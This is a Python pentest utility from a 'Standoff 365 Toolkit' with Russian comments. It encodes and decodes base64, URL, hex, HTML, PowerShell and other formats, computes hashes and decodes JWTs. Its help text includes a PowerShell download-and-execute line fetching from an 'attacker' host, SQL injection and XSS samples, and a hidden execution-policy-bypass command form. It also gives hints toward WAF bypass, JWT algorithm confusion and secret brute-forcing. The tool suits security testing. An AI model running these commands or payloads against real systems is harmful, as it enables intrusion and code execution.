#!/usr/bin/env python3
"""
encode.py — кодирование/декодирование данных для пентеста
Standoff 365 Toolkit

Поддерживает: base64, url, hex, html, unicode, rot13,
              md5/sha1/sha256, jwt decode, gzip

Использование:
  python encode.py base64 encode "hello world"
  python encode.py url encode "hello world&test=1"
  python encode.py hex encode "hello"
  python encode.py jwt decode "eyJ..."
  python encode.py hash md5 "password"
  python encode.py all encode "hello world"    # все кодировки сразу
  python encode.py identify "eyJhbGci..."      # автоопределение типа
  echo "hello" | python encode.py base64 encode -  # из stdin
"""

import argparse
import base64
import binascii
import codecs
import gzip
import hashlib
import html
import json
import re
import sys
import urllib.parse
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

console = Console() if HAS_RICH else None


# =============================================================================
# Утилиты
# =============================================================================

def out(label, value, color="green"):
    if HAS_RICH:
        console.print(f"[cyan]{label}:[/cyan] [{color}]{value}[/{color}]")
    else:
        print(f"{label}: {value}")

def section(title):
    if HAS_RICH:
        console.print(f"\n[bold magenta]── {title} ──[/bold magenta]")
    else:
        print(f"\n-- {title} --")

def read_input(data_arg):
    """Читаем данные — из аргумента или stdin."""
    if data_arg == "-":
        return sys.stdin.read().rstrip("\n")
    return data_arg


# =============================================================================
# BASE64
# =============================================================================

def b64_encode(data: str) -> str:
    return base64.b64encode(data.encode()).decode()

def b64_decode(data: str) -> str:
    # Добавляем паддинг если нужно
    data = data.strip()
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    try:
        return base64.b64decode(data).decode("utf-8", errors="replace")
    except Exception as e:
        return f"[ERROR] {e}"

def b64_encode_url(data: str) -> str:
    """Base64 URL-safe (без +/=)."""
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

def b64_decode_url(data: str) -> str:
    data = data.strip()
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    try:
        return base64.urlsafe_b64decode(data).decode("utf-8", errors="replace")
    except Exception as e:
        return f"[ERROR] {e}"


# =============================================================================
# URL ENCODING
# =============================================================================

def url_encode(data: str, full=False) -> str:
    if full:
        # Кодируем всё включая буквы (для WAF bypass)
        return "".join(f"%{ord(c):02X}" for c in data)
    return urllib.parse.quote(data, safe="")

def url_decode(data: str) -> str:
    return urllib.parse.unquote(data)

def url_encode_double(data: str) -> str:
    """Double URL encoding — %25XX вместо %XX."""
    encoded = url_encode(data)
    return encoded.replace("%", "%25")

def url_encode_unicode(data: str) -> str:
    """Unicode encoding — %u0041 вместо A."""
    result = []
    for c in data:
        if ord(c) > 127 or not c.isalnum():
            result.append(f"%u{ord(c):04X}")
        else:
            result.append(c)
    return "".join(result)


# =============================================================================
# HEX
# =============================================================================

def hex_encode(data: str) -> str:
    return data.encode().hex()

def hex_decode(data: str) -> str:
    try:
        return bytes.fromhex(data.strip()).decode("utf-8", errors="replace")
    except Exception as e:
        return f"[ERROR] {e}"

def hex_encode_escape(data: str) -> str:
    """\\xHH формат."""
    return "".join(f"\\x{b:02x}" for b in data.encode())

def hex_encode_0x(data: str) -> str:
    """0xHH формат (для SQL)."""
    return "0x" + data.encode().hex()


# =============================================================================
# HTML ENCODING
# =============================================================================

def html_encode(data: str) -> str:
    return html.escape(data, quote=True)

def html_decode(data: str) -> str:
    return html.unescape(data)

def html_encode_decimal(data: str) -> str:
    """&#DD; формат."""
    return "".join(f"&#{ord(c)};" for c in data)

def html_encode_hex(data: str) -> str:
    """&#xHH; формат."""
    return "".join(f"&#x{ord(c):02x};" for c in data)


# =============================================================================
# UNICODE
# =============================================================================

def unicode_encode(data: str) -> str:
    """\\uXXXX формат."""
    return "".join(f"\\u{ord(c):04x}" for c in data)

def unicode_decode(data: str) -> str:
    try:
        return data.encode().decode("unicode_escape")
    except Exception as e:
        return f"[ERROR] {e}"

def unicode_encode_full(data: str) -> str:
    """Полный Unicode escape \\UXXXXXXXX."""
    return data.encode("unicode_escape").decode()


# =============================================================================
# ROT / CAESAR
# =============================================================================

def rot13(data: str) -> str:
    return codecs.encode(data, "rot_13")

def caesar(data: str, shift: int = 13) -> str:
    result = []
    for c in data:
        if c.isalpha():
            base = ord("A") if c.isupper() else ord("a")
            result.append(chr((ord(c) - base + shift) % 26 + base))
        else:
            result.append(c)
    return "".join(result)


# =============================================================================
# ХЕШИ
# =============================================================================

def hash_data(data: str, algorithm: str) -> str:
    algos = {
        "md5":    hashlib.md5,
        "sha1":   hashlib.sha1,
        "sha256": hashlib.sha256,
        "sha512": hashlib.sha512,
        "sha224": hashlib.sha224,
        "sha384": hashlib.sha384,
    }
    if algorithm not in algos:
        return f"[ERROR] Неизвестный алгоритм: {algorithm}"
    return algos[algorithm](data.encode()).hexdigest()

def ntlm_hash(data: str) -> str:
    """NTLM хеш пароля."""
    import hashlib
    return hashlib.new("md4", data.encode("utf-16-le")).hexdigest()

def all_hashes(data: str) -> dict:
    algos = ["md5", "sha1", "sha256", "sha512"]
    result = {algo: hash_data(data, algo) for algo in algos}
    try:
        result["ntlm"] = ntlm_hash(data)
    except Exception:
        pass
    return result


# =============================================================================
# GZIP
# =============================================================================

def gzip_encode(data: str) -> str:
    compressed = gzip.compress(data.encode())
    return base64.b64encode(compressed).decode()

def gzip_decode(data: str) -> str:
    try:
        compressed = base64.b64decode(data)
        return gzip.decompress(compressed).decode("utf-8", errors="replace")
    except Exception as e:
        return f"[ERROR] {e}"


# =============================================================================
# JWT DECODER
# =============================================================================

def jwt_decode(token: str) -> dict:
    """Декодируем JWT без проверки подписи."""
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        return {"error": "Не похоже на JWT (нужно 3 части через точку)"}

    result = {}
    for i, (name, part) in enumerate(
        zip(["header", "payload", "signature"], parts)
    ):
        if i < 2:  # Header и Payload — base64url
            padding = 4 - len(part) % 4
            if padding != 4:
                part += "=" * padding
            try:
                decoded = base64.urlsafe_b64decode(part)
                result[name] = json.loads(decoded)
            except Exception as e:
                result[name] = f"[ERROR] {e}"
        else:
            result["signature"] = part
            result["signature_raw"] = part

    return result


# =============================================================================
# POWERSHELL BASE64
# =============================================================================

def ps_encode(cmd: str) -> str:
    """Кодируем PowerShell команду в Base64 для -EncodedCommand."""
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()
    return f"powershell -EncodedCommand {encoded}"

def ps_decode(encoded: str) -> str:
    """Декодируем PowerShell -EncodedCommand."""
    # Убираем префикс если есть
    encoded = re.sub(r'^powershell.*-[Ee]ncodedCommand\s+', '', encoded.strip())
    try:
        return base64.b64decode(encoded).decode("utf-16-le")
    except Exception as e:
        return f"[ERROR] {e}"


# =============================================================================
# АВТООПРЕДЕЛЕНИЕ ТИПА ДАННЫХ
# =============================================================================

def identify(data: str) -> list:
    """Пытаемся определить тип кодирования."""
    data = data.strip()
    results = []

    # JWT
    if re.match(r'^eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$', data):
        results.append(("JWT", "Возможно JWT токен"))

    # Base64
    if re.match(r'^[A-Za-z0-9+/]+=*$', data) and len(data) % 4 == 0:
        try:
            decoded = base64.b64decode(data).decode("utf-8")
            results.append(("Base64", f"Декодирован: {decoded[:100]}"))
        except Exception:
            pass

    # Base64 URL-safe
    if re.match(r'^[A-Za-z0-9_-]+$', data):
        try:
            padding = 4 - len(data) % 4
            if padding != 4:
                data_padded = data + "=" * padding
            else:
                data_padded = data
            decoded = base64.urlsafe_b64decode(data_padded).decode("utf-8")
            if decoded.isprintable():
                results.append(("Base64 URL-safe", f"Декодирован: {decoded[:100]}"))
        except Exception:
            pass

    # URL-encoded
    if "%" in data:
        decoded = urllib.parse.unquote(data)
        results.append(("URL-encoded", f"Декодирован: {decoded[:100]}"))

    # Hex
    if re.match(r'^[0-9a-fA-F]+$', data) and len(data) % 2 == 0:
        try:
            decoded = bytes.fromhex(data).decode("utf-8")
            results.append(("Hex", f"Декодирован: {decoded[:100]}"))
        except Exception:
            pass

    # 0x hex
    if data.startswith("0x") and re.match(r'^0x[0-9a-fA-F]+$', data):
        try:
            decoded = bytes.fromhex(data[2:]).decode("utf-8")
            results.append(("Hex (0x)", f"Декодирован: {decoded[:100]}"))
        except Exception:
            pass

    # HTML entities
    if "&" in data and ";" in data:
        decoded = html.unescape(data)
        if decoded != data:
            results.append(("HTML entities", f"Декодирован: {decoded[:100]}"))

    # Unicode escape
    if "\\u" in data or "\\U" in data:
        try:
            decoded = data.encode().decode("unicode_escape")
            results.append(("Unicode escape", f"Декодирован: {decoded[:100]}"))
        except Exception:
            pass

    # MD5
    if re.match(r'^[a-fA-F0-9]{32}$', data):
        results.append(("MD5 hash", "32 hex символа — похоже на MD5"))

    # SHA1
    if re.match(r'^[a-fA-F0-9]{40}$', data):
        results.append(("SHA1 hash", "40 hex символов — похоже на SHA1"))

    # SHA256
    if re.match(r'^[a-fA-F0-9]{64}$', data):
        results.append(("SHA256 hash", "64 hex символа — похоже на SHA256"))

    # NTLM hash LM:NT
    if re.match(r'^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$', data):
        results.append(("NTLM hash", "LM:NT формат"))

    # PowerShell encoded
    if re.match(r'^[A-Za-z0-9+/]+=*$', data) and len(data) > 50:
        try:
            decoded = base64.b64decode(data).decode("utf-16-le")
            if any(kw in decoded.lower() for kw in
                   ["powershell", "invoke", "iex", "$", "get-"]):
                results.append(("PowerShell Base64", f"Команда: {decoded[:100]}"))
        except Exception:
            pass

    if not results:
        results.append(("Неизвестно", "Тип не определён — попробуй вручную"))

    return results


# =============================================================================
# ALL — все кодировки сразу
# =============================================================================

def encode_all(data: str) -> dict:
    """Кодируем данные во все форматы."""
    return {
        "base64":            b64_encode(data),
        "base64_urlsafe":    b64_encode_url(data),
        "url_encode":        url_encode(data),
        "url_encode_full":   url_encode(data, full=True),
        "url_double":        url_encode_double(data),
        "hex":               hex_encode(data),
        "hex_escape":        hex_encode_escape(data),
        "hex_0x":            hex_encode_0x(data),
        "html_named":        html_encode(data),
        "html_decimal":      html_encode_decimal(data),
        "html_hex":          html_encode_hex(data),
        "unicode":           unicode_encode(data),
        "rot13":             rot13(data),
        "gzip_b64":          gzip_encode(data),
        "ps_base64":         ps_encode(data),
    }


# =============================================================================
# MAIN
# =============================================================================

def parse_args():
    p = argparse.ArgumentParser(
        description="encode.py — кодирование/декодирование для пентеста",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  python encode.py base64 encode "hello world"
  python encode.py base64 decode "aGVsbG8gd29ybGQ="
  python encode.py url encode "admin' OR 1=1--"
  python encode.py url encode "test" --full
  python encode.py hex encode "hello"
  python encode.py html encode "<script>alert(1)</script>"
  python encode.py unicode encode "alert(1)"
  python encode.py hash md5 "password"
  python encode.py hash all "password123"
  python encode.py hash ntlm "Password1"
  python encode.py jwt decode "eyJhbGciOiJIUzI1NiJ9..."
  python encode.py powershell encode "IEX(New-Object Net.WebClient).downloadString('http://attacker/s.ps1')"
  python encode.py gzip encode "large payload here"
  python encode.py all encode "test payload"
  python encode.py identify "eyJhbGci..."
  echo "hello" | python encode.py base64 encode -
        """
    )

    sub = p.add_subparsers(dest="encoding")

    # Общий родитель
    parent = argparse.ArgumentParser(add_help=False)
    parent.add_argument("operation", nargs="?",
                        choices=["encode", "decode"],
                        help="encode или decode")
    parent.add_argument("data", nargs="?", default="",
                        help="Данные для обработки (или - для stdin)")
    parent.add_argument("--full", action="store_true",
                        help="Полное кодирование (все символы)")

    # base64
    sub.add_parser("base64", parents=[parent], help="Base64")
    # url
    sub.add_parser("url",    parents=[parent], help="URL encoding")
    # hex
    sub.add_parser("hex",    parents=[parent], help="Hex encoding")
    # html
    sub.add_parser("html",   parents=[parent], help="HTML encoding")
    # unicode
    sub.add_parser("unicode",parents=[parent], help="Unicode escape")
    # rot13
    sub.add_parser("rot13",  parents=[parent], help="ROT13")
    # gzip
    sub.add_parser("gzip",   parents=[parent], help="Gzip + Base64")
    # powershell
    sub.add_parser("powershell", parents=[parent],
                   help="PowerShell Base64 (-EncodedCommand)")

    # hash
    hash_p = sub.add_parser("hash", help="Хеширование")
    hash_p.add_argument("algorithm",
                        choices=["md5", "sha1", "sha256", "sha512",
                                 "sha224", "sha384", "ntlm", "all"])
    hash_p.add_argument("data", nargs="?", default="")

    # jwt
    jwt_p = sub.add_parser("jwt", help="JWT decode")
    jwt_p.add_argument("operation", nargs="?", default="decode")
    jwt_p.add_argument("data", nargs="?", default="")

    # all
    all_p = sub.add_parser("all", help="Все кодировки сразу")
    all_p.add_argument("operation", nargs="?", default="encode")
    all_p.add_argument("data", nargs="?", default="")

    # identify
    id_p = sub.add_parser("identify", help="Автоопределение типа кодирования")
    id_p.add_argument("data", nargs="?", default="")

    return p.parse_args()


def main():
    args = parse_args()

    if not args.encoding:
        if HAS_RICH:
            console.print(Panel.fit(
                "[bold cyan]encode.py[/bold cyan] — кодирование для пентеста\n\n"
                "Команды: base64, url, hex, html, unicode,\n"
                "         rot13, gzip, powershell, hash, jwt, all, identify\n\n"
                "[dim]python encode.py --help[/dim]",
                title="Standoff 365 Toolkit",
                border_style="cyan"
            ))
        else:
            print("Использование: python encode.py <encoding> <operation> <data>")
            print("python encode.py --help")
        return

    # Читаем данные
    data_arg = getattr(args, "data", "") or ""
    data     = read_input(data_arg) if data_arg else ""

    if not data and args.encoding not in ("identify",):
        data = input("Введи данные: ").strip()

    enc = args.encoding
    op  = getattr(args, "operation", "encode")

    # ── BASE64 ────────────────────────────────────────────────────────────
    if enc == "base64":
        if op == "encode":
            section("Base64")
            out("Standard",   b64_encode(data))
            out("URL-safe",   b64_encode_url(data))
            out("For PS -e",  base64.b64encode(data.encode("utf-16-le")).decode())
        else:
            section("Base64 Decode")
            out("Standard",  b64_decode(data))
            out("URL-safe",  b64_decode_url(data))

    # ── URL ───────────────────────────────────────────────────────────────
    elif enc == "url":
        if op == "encode":
            section("URL Encoding")
            out("Standard",       url_encode(data))
            out("Full (all chars)", url_encode(data, full=True))
            out("Double",          url_encode_double(data))
            out("Unicode (%u)",    url_encode_unicode(data))
        else:
            out("URL Decoded", url_decode(data))

    # ── HEX ───────────────────────────────────────────────────────────────
    elif enc == "hex":
        if op == "encode":
            section("Hex Encoding")
            out("Hex",        hex_encode(data))
            out("\\xHH",      hex_encode_escape(data))
            out("0xHH (SQL)", hex_encode_0x(data))
        else:
            section("Hex Decode")
            clean = data.replace("\\x", "").replace("0x", "").replace(" ", "")
            out("Decoded", hex_decode(clean))

    # ── HTML ──────────────────────────────────────────────────────────────
    elif enc == "html":
        if op == "encode":
            section("HTML Encoding")
            out("Named entities",   html_encode(data))
            out("Decimal (&#DD;)",  html_encode_decimal(data))
            out("Hex (&#xHH;)",     html_encode_hex(data))
        else:
            out("HTML Decoded", html_decode(data))

    # ── UNICODE ───────────────────────────────────────────────────────────
    elif enc == "unicode":
        if op == "encode":
            section("Unicode Encoding")
            out("\\uXXXX",  unicode_encode(data))
            out("Python repr", repr(data))
        else:
            out("Unicode Decoded", unicode_decode(data))

    # ── ROT13 ─────────────────────────────────────────────────────────────
    elif enc == "rot13":
        out("ROT13", rot13(data))

    # ── GZIP ──────────────────────────────────────────────────────────────
    elif enc == "gzip":
        if op == "encode":
            out("Gzip+Base64", gzip_encode(data))
        else:
            out("Gzip Decoded", gzip_decode(data))

    # ── POWERSHELL ────────────────────────────────────────────────────────
    elif enc == "powershell":
        if op == "encode":
            section("PowerShell Base64")
            encoded = base64.b64encode(data.encode("utf-16-le")).decode()
            out("Encoded",   encoded)
            out("Full cmd",  f"powershell -EncodedCommand {encoded}")
            out("Hidden",
                f"powershell -NoP -NonI -W Hidden -Exec Bypass "
                f"-EncodedCommand {encoded}")
        else:
            out("PS Decoded", ps_decode(data))

    # ── HASH ──────────────────────────────────────────────────────────────
    elif enc == "hash":
        algo = args.algorithm
        if algo == "all":
            section(f"All Hashes: {data[:30]}")
            hashes = all_hashes(data)
            for name, value in hashes.items():
                out(name.upper(), value)
        elif algo == "ntlm":
            out("NTLM", ntlm_hash(data))
        else:
            out(algo.upper(), hash_data(data, algo))

    # ── JWT ───────────────────────────────────────────────────────────────
    elif enc == "jwt":
        section("JWT Decode")
        decoded = jwt_decode(data)
        if HAS_RICH:
            for part, content in decoded.items():
                if isinstance(content, dict):
                    console.print(f"\n[bold cyan]{part.upper()}:[/bold cyan]")
                    console.print(
                        Syntax(
                            json.dumps(content, indent=2, ensure_ascii=False),
                            "json", theme="monokai",
                            background_color="default"
                        )
                    )
                else:
                    out(part.upper(), str(content))

            # Проверяем алгоритм
            header_data = decoded.get("header", {})
            if isinstance(header_data, dict):
                alg = header_data.get("alg", "")
                if alg == "none":
                    console.print(
                        "[bold red]WARN: alg=none — токен без подписи![/bold red]"
                    )
                elif alg in ("RS256", "RS384", "RS512"):
                    console.print(
                        "[yellow]INFO: RS* алгоритм — "
                        "попробуй RS256→HS256 confusion атаку[/yellow]"
                    )
                elif alg.startswith("HS"):
                    console.print(
                        "[yellow]INFO: HMAC алгоритм — "
                        "попробуй брут секрета: "
                        "hashcat -m 16500 token.txt rockyou.txt[/yellow]"
                    )
        else:
            print(json.dumps(decoded, indent=2, ensure_ascii=False))

    # ── ALL ───────────────────────────────────────────────────────────────
    elif enc == "all":
        section(f"Все кодировки: {data[:40]}")
        results = encode_all(data)
        if HAS_RICH:
            table = Table(show_header=True, header_style="bold cyan")
            table.add_column("Тип",    style="cyan", width=20)
            table.add_column("Результат", style="green", no_wrap=False)
            for name, value in results.items():
                table.add_row(name, value[:120] + ("..." if len(value) > 120 else ""))
            console.print(table)
        else:
            for name, value in results.items():
                print(f"{name:25s} {value[:100]}")

    # ── IDENTIFY ──────────────────────────────────────────────────────────
    elif enc == "identify":
        data = data or (input("Введи данные для анализа: ").strip())
        section(f"Автоопределение: {data[:50]}...")
        results = identify(data)
        if HAS_RICH:
            table = Table(show_header=True, header_style="bold cyan")
            table.add_column("Тип",     style="cyan",  width=20)
            table.add_column("Описание", style="green", width=60)
            for t, desc in results:
                table.add_row(t, desc)
            console.print(table)
        else:
            for t, desc in results:
                print(f"  {t}: {desc}")


if __name__ == "__main__":
    main()